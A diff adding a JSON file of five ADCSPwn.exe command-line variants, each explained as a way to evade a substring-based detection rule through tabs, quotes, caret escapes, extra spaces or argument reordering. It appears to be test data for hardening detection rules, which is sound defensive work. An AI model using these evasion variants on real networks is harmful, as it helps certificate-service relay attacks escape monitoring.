@@ -1,0 +1,22 @@
+[
+  {
+    "output": "ADCSPwn.exe --adcs\tca.domain.local --port\t443",
+    "explanation": "Substitution technique: Replacing the required single structural space parameter padding flanking the options (' --adcs ' and ' --port ') with horizontal tab characters ('\\t'). The underlying command line parser framework handles horizontal tabs natively as valid whitespace token separators, executing the application identically while completely evading the strict space-padded literal substring conditions."
+  },
+  {
+    "output": "ADCSPwn.exe \"--adcs\" ca.domain.local \"--port\" 443",
+    "explanation": "Insertion technique: Enclosing the key configuration switches inside explicit double quotes ('\"--adcs\"' and '\"--port\"'). This alters the exact string sequence logged by the process creation telemetry, successfully disrupting the continuous text pattern check requiring space padding around unquoted hyphens, while the application strips the quotes natively during initialization."
+  },
+  {
+    "output": "cmd.exe /c ADCSPwn.exe --adcs^  ca.domain.local --port^  443",
+    "explanation": "Insertion technique: Spawning the execution through a cmd.exe context allows the integration of a command shell caret escape character ('^') directly into the trailing space boundary segment of the option flags. The parent command shell processes and drops the caret prior to child process creation, resulting in a recorded command-line trace of '--adcs^  ' and '--port^  ' that successfully blinds the rule's literal token filter."
+  },
+  {
+    "output": "ADCSPwn.exe  --adcs  ca.domain.local  --port  443",
+    "explanation": "Insertion technique: Injecting multiple consecutive spaces between the option arguments instead of a single space delimiter. Standard argument parsing models collapse contiguous whitespaces into single parameter arrays at execution initialization, ensuring functional equivalence while breaking rigid signature strings that look for an explicit single-space prefix structure."
+  },
+  {
+    "output": "ADCSPwn.exe --port 443 --adcs ca.domain.local",
+    "explanation": "Reordering technique: Changing the positional order of the mandatory argument switches in the execution sequence. While the rule implements a 'contains|all' logical modifier which still technically evaluates to true against simple presence, mutating default linear configurations exposes and breaks fragile custom regex logic or sequential state tracking patterns often deployed in production pipelines."
+  }
+]
